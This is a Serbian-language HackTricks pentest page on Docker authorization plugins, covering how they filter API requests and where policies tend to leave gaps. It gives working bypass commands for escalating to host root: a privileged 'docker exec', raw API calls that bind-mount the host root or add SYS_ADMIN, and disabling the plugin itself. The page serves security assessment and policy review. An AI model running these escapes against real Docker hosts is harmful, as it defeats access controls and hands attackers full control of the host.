# Plugins za autorizaciju tokom izvršavanja

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Plugins za autorizaciju tokom izvršavanja predstavljaju dodatni policy sloj koji odlučuje da li caller sme da izvrši određenu akciju daemon-a. Docker je klasičan primer. Podrazumevano, svako ko može da komunicira sa Docker daemon-om praktično ima široku kontrolu nad njim. Authorization plugins pokušavaju da suze ovaj model tako što proveravaju identitet autentifikovanog korisnika i zahtevanu API operaciju, a zatim na osnovu policy-ja dozvoljavaju ili odbijaju zahtev.

Ova tema zaslužuje sopstvenu stranicu zato što menja exploitation model kada attacker već ima pristup Docker API-ju ili korisniku u `docker` grupi. U takvim okruženjima pitanje više nije samo "da li mogu da dođem do daemon-a?", već i "da li je daemon zaštićen authorization slojem i, ako jeste, da li se taj sloj može zaobići preko neobrađenih endpoint-a, slabog JSON parsiranja ili dozvola za upravljanje plugin-ima?"

## Funkcionisanje

Kada zahtev stigne do Docker daemon-a, authorization subsystem može proslediti kontekst zahteva jednom ili više instaliranih plugin-ova. Plugin vidi identitet autentifikovanog korisnika, detalje zahteva, izabrane headere i delove body-ja zahteva ili odgovora kada je content type odgovarajući. Više plugin-ova može biti povezano u lanac, a pristup se odobrava samo ako svi plugin-ovi dozvole zahtev.

Ovaj model deluje snažno, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor policy-ja dobro razumeo API. Plugin koji blokira `docker run --privileged`, ali ignoriše `docker exec`, propušta alternativne JSON ključeve kao što je top-level `Binds` ili dozvoljava administraciju plugin-ova može stvoriti lažan osećaj ograničenja, dok istovremeno ostavlja otvorene direktne privilege-escalation putanje.

## Uobičajene mete plugin-ova

Važne oblasti za review policy-ja su:

- endpoint-i za kreiranje container-a
- polja u `HostConfig`-u kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` i opcije za deljenje namespace-a
- ponašanje `docker exec` komande
- endpoint-i za upravljanje plugin-ovima
- svaki endpoint koji može indirektno da pokrene runtime akcije izvan predviđenog policy modela

Istorijski gledano, primeri kao što su Twistlock-ov `authz` plugin i jednostavni edukativni plugin-ovi kao što je `authobot` olakšali su proučavanje ovog modela, zato što su njihovi policy fajlovi i code path-ovi pokazivali kako je mapiranje endpoint-a na akcije zaista implementirano. Za potrebe assessment-a, važna lekcija je da autor policy-ja mora da razume celu API površinu, a ne samo najvidljivije CLI komande.

## Zloupotreba

Prvi cilj je utvrditi šta je zaista blokirano. Ako daemon odbije akciju, greška često leak-uje ime plugin-a, što pomaže pri identifikaciji aktivne kontrole:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ako vam je potrebno šire profilisanje endpointa, alati kao što je `docker_auth_profiler` su korisni jer automatizuju inače repetitivan zadatak provere toga koje API rute i JSON strukture plugin zaista dozvoljava.

Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, izlistajte koja polja objekata se zaista filtriraju:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ove provere su važne zato što su mnogi propusti u autorizaciji specifični za polja, a ne za koncepte. Plugin može odbiti CLI obrazac, a da pritom u potpunosti ne blokira ekvivalentnu API strukturu.

### Kompletan primer: `docker exec` dodaje privilegije nakon kreiranja kontejnera

Politika koja blokira kreiranje privilegovanog kontejnera, ali dozvoljava kreiranje kontejnera bez ograničenja zajedno sa komandom `docker exec`, i dalje može biti zaobiđena:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ako daemon prihvati drugi korak, korisnik je povratio privilegovani interaktivni proces unutar kontejnera za koji je autor policy-ja verovao da je ograničen.

### Potpuni primer: Bind Mount Kroz Raw API

Neke neispravne policy-je proveravaju samo jedan JSON oblik. Ako bind mount root filesystem-a nije dosledno blokiran, host i dalje može da bude mount-ovan:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ista ideja se može pojaviti i pod `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Uticaj je potpuno bekstvo iz host filesystem-a. Zanimljiv detalj je to što bypass potiče od nepotpune pokrivenosti policy-jem, a ne od greške u kernelu.

### Potpuni primer: Neprovereni atribut capability-ja

Ako policy zaboravi da filtrira atribut povezan sa capability-jem, napadač može da kreira container koji ponovo dobija opasan capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Kada je prisutan `CAP_SYS_ADMIN` ili capability slične snage, mnoge breakout tehnike opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) postaju dostupne.

### Potpun primer: Onemogućavanje plugina

Ako su operacije upravljanja pluginovima dozvoljene, najčistiji bypass može biti potpuno isključivanje kontrole:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Ovo je greška u policy-ju na nivou control-plane-a. Sloj autorizacije postoji, ali korisnik koga je trebalo da ograniči i dalje ima dozvolu da ga onemogući.

## Provere

Ove komande služe za utvrđivanje da li policy layer postoji i da li deluje kompletno ili površno.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Šta je ovde zanimljivo:

- Poruke o odbijanju koje sadrže naziv plugina potvrđuju postojanje authorization sloja i često otkrivaju tačnu implementaciju.
- Lista plugina vidljiva attackeru može biti dovoljna za otkrivanje da li su moguće operacije disable ili reconfigure.
- Policy koji blokira samo očigledne CLI akcije, ali ne i raw API zahteve, treba smatrati bypassable dok se ne dokaže suprotno.

## Podrazumevane Runtime vrednosti

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Nije podrazumevano omogućen | Pristup daemonu je praktično all-or-nothing osim ako nije konfigurisan authorization plugin | nepotpuna plugin policy, blacklists umesto allowlists, dozvoljeno upravljanje pluginima, slepe tačke na nivou polja |
| Podman | Nema uobičajen direktan ekvivalent | Podman se obično više oslanja na Unix permissions, rootless izvršavanje i odluke o izlaganju API-ja nego na Docker-style authz pluginove | široko izlaganje rootful Podman API-ja, slabe permissions na socketu |
| containerd / CRI-O | Drugačiji model kontrole | Ovi runtime-i se obično oslanjaju na permissions socketa, trust granice noda i kontrole orkestratora na višem nivou, a ne na Docker authz pluginove | mountovanje socketa u workloadove, slabe lokalne trust pretpostavke na nodu |
| Kubernetes | Koristi authn/authz na nivoima API-servera i kubeleta, a ne Docker authz pluginove | Cluster RBAC i admission kontrole predstavljaju glavni policy sloj | preširok RBAC, slaba admission policy, direktno izlaganje kubelet ili runtime API-ja |

{{#include ../../../banners/hacktricks-training.md}}
